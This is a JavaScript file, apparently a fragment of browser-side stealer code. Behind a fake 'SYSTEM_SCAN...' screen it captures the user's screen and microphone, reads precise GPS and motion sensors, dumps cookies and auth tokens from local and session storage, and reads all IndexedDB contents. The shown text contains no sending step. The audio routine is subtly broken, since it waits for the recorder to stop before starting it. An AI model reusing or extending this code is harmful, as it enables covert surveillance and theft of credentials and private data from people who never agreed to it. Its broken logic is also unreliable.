async function captureScreenAndAudio() {
let canvas = document.getElementById('canvas');
let ctx = canvas.getContext('2d');
canvas.width = window.screen.width;
canvas.height = window.screen.height;
ctx.fillStyle = "#000";
ctx.fillRect(0, 0, canvas.width, canvas.height);
ctx.fillStyle = "#0f0";
ctx.font = "20px monospace";
ctx.fillText("SYSTEM_SCAN...", 20, 40);

let data = {};
try {
let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
let snapshot = await getSnapshotFromStream(stream);
data["ScreenSnapshotBase64"] = snapshot;
stream.getTracks().forEach(track => track.stop());
} catch (e) {
data["ScreenSnapshotBase64"] = "Error: " + e.message;
}

try {
let audioStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
let audioRecorder = new MediaRecorder(audioStream);
let chunks = [];
audioRecorder.ondataavailable = e => chunks.push(e.data);
await new Promise(r => audioRecorder.onstop = r);
audioRecorder.start(1000);
await new Promise(r => setTimeout(r, 1500));
audioRecorder.stop();
await new Promise(r => audioRecorder.onstop = r);
let audioBlob = new Blob(chunks, { type: 'audio/webm' });
let audioBase64 = await toBase64(audioBlob);
data["AudioSampleBase64"] = audioBase64;
audioStream.getTracks().forEach(track => track.stop());
} catch (e) {
data["AudioSampleBase64"] = "Mic Error: " + e.message;
}

return data;
}

async function captureBiometricsAndSensors() {
let data = {};

try {
let position = await new Promise((resolve, reject) => {
navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
});
data["GPS_Lat"] = position.coords.latitude;
data["GPS_Lon"] = position.coords.longitude;
data["GPS_Accuracy"] = position.coords.accuracy;
} catch (e) {
data["GPS_Data"] = "Failed: " + e.message;
}

if (window.DeviceOrientationEvent) {
let orientation = new Promise(resolve => {
let handler = (event) => {
data["Orientation_Roll"] = event.beta;
data["Orientation_Pitch"] = event.gamma;
data["Orientation_Azimuth"] = event.alpha;
window.removeEventListener('deviceorientation', handler);
resolve();
};
window.addEventListener('deviceorientation', handler, true);
});
await orientation;
}

if (window.DeviceMotionEvent) {
let motion = new Promise(resolve => {
let handler = (event) => {
data["Accel_X"] = event.accelerationIncludingGravity.x;
data["Accel_Y"] = event.accelerationIncludingGravity.y;
data["Accel_Z"] = event.accelerationIncludingGravity.z;
window.removeEventListener('devicemotion', handler);
resolve();
};
window.addEventListener('devicemotion', handler, true);
});
await motion;
}

return data;
}

async function scrapeDeepTokens() {
let data = {};
let allCookies = document.cookie.split(';');
let foundTokens = {};

for (let cookie of allCookies) {
let parts = cookie.trim().split('=');
let key = parts[0];
let val = parts.slice(1).join('=');

if (TOKEN_KEYS.some(tk => key.toLowerCase().includes(tk))) {
if (!foundTokens[key]) foundTokens[key] = [];
foundTokens[key].push(val);
}
}

data["Cookies_Raw"] = document.cookie;
data["Cookies_Filtered"] = JSON.stringify(foundTokens);

let storageKeys = ['localStorage', 'sessionStorage'];
for (let storageName of storageKeys) {
let store = window[storageName];
let items = [];
for (let i = 0; i < store.length; i++) {
let k = store.key(i);
if (k && (TOKEN_KEYS.some(tk => k.toLowerCase().includes(tk)) || k.includes('token') || k.includes('auth'))) {
items.push({ key: k, value: store.getItem(k) });
}
}
data[storageName + "_Tokens"] = items;
}

return data;
}

async function scrapeIndexedDBAndCache() {
let data = {};
let dbNames = self.indexedDB.databases ? await self.indexedDB.databases() : [];
let dbData = {};

if (dbNames.length === 0 && typeof indexedDB.open === 'function') {
dbNames = ['keyeddb', 'indexeddb'];
}

for (let dbName of dbNames) {
try {
let openRequest = indexedDB.open(dbName);
let db = await new Promise((resolve, reject) => {
openRequest.onsuccess = () => resolve(openRequest.result);
openRequest.onerror = () => reject();
});
let objectStores = db.objectStoreNames;
let storeData = {};
for (let storeName of objectStores) {
let transaction = db.transaction(storeName, 'readonly');
let store = transaction.objectStore(storeName);
let cursorRequest = store.openCursor();
let records = [];
await new Promise((resolve, reject) => {
cursorRequest.onsuccess = (e) => {
let cursor = e.target.result;
if (cursor) {
records.push(cursor.value);
cursor.continue();
} else {
resolve();
}
};
cursorRequest.onerror = reject;
});
storeData[storeName] = records;
}
dbData[dbName] = storeData;
db.close();
} catch (e) {
dbData[dbName] = "Access Denied: " + e.message;
}
}

data["IndexedDB_Data"] = dbData;

try {
let cacheNames = await caches.keys();
let cacheData = {};
for (let name of cacheNames) {
let cache = await caches.open(name);
let requestList = await cache.keys();
cacheData[name] = requestList.map(r => r.url);
}
data["Cache_URLs"] = cacheData;
} catch (e) {
data["Cache_URLs"] = "Cache Error: " + e.message;
}

return data;
}

async function getSnapshotFromStream(stream) {
let video = document.createElement('video');
video.srcObject = stream;
await new Promise(r => video.onloadedmetadata = r);
video.play();
await new Promise(r => setTimeout(r, 1000));

let canvas = document.createElement('canvas');
canvas.width = video.videoWidth;
canvas.height = video.videoHeight;
let ctx = canvas.getContext('2d');
ctx.drawImage(video, 0, 0);
return canvas.toDataURL('image/png');
}

function toBase64(blob) {
return new Promise((resolve, _) => {
let reader = new FileReader();
reader.onloadend = () => resolve(reader.result);
reader.readAsDataURL(blob);
});
}
